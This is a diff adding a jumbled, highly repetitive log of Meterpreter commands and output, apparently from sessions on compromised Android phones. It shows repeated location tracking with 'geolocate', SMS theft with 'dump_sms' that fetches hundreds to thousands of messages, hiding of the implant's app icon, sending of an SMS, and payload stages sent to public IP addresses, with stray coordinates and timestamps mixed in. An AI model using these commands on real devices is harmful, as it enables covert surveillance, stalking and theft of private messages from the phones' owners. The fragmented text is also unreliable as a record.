@@ -1,0 +1,147 @@
+34.0779403
+34.0779403
+34.0779403
+34.0779403
+[*] Stopped
+34.0779403
+34.0779403
+meterpreter > geolocate
+34.0779403
+[*] Stopped
+34.0779403
+34.0779403
+34.0779403
+34.0779403
+meterpreter > geolocate
+34.0779403
+34.0779403
+34.0779403
+34.0779403
+34.0779403
+34.0779403
+34.0779403meterpreter > exploit
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > dump_sms -o /root/django/users/administrator/dumpsms.txt
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > dump_sms -o /root/django/users/administrator/dumpsms.txt
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+ 2019-02-24 06:02:18 +0000
+meterpreter > dump_sms -o /root/django/users/administrator/dumpsms.txt
+meterpreter > geolocate
+meterpreter > geolocate
+[*] Stopped
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+[*] Stopped
+meterpreter > geolocate
+[*] Fetching 457 sms messages
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > hide_app_icon
+meterpreter > send_sms -d 09187628473 -t "-"
+[*] Stopped
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+[*] Sending stage (70653 bytes) to 2.179.118.154
+[*] Sending stage (70653 bytes) to 5.122.35.115
+meterpreter > hide_app_icon
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+[*] Sending stage (70653 bytes) to 5.218.177.187
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > hide_app_icon
+36.3111473
+36.3080511
+[*] Fetching 4237 sms messages
+36.3073516
+ at 2019-04-11 19:26:31 +0000
+meterpreter > geolocate
+ 2019-05-06 12:34:06 +0000
+
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+[*] Stopped
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > hide_app_icon
+meterpreter > geolocate
+at 2019-05-20 07:48:46 +0000
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+meterpreter > geolocate
+t 2019-07-18 07:14:26 +0000
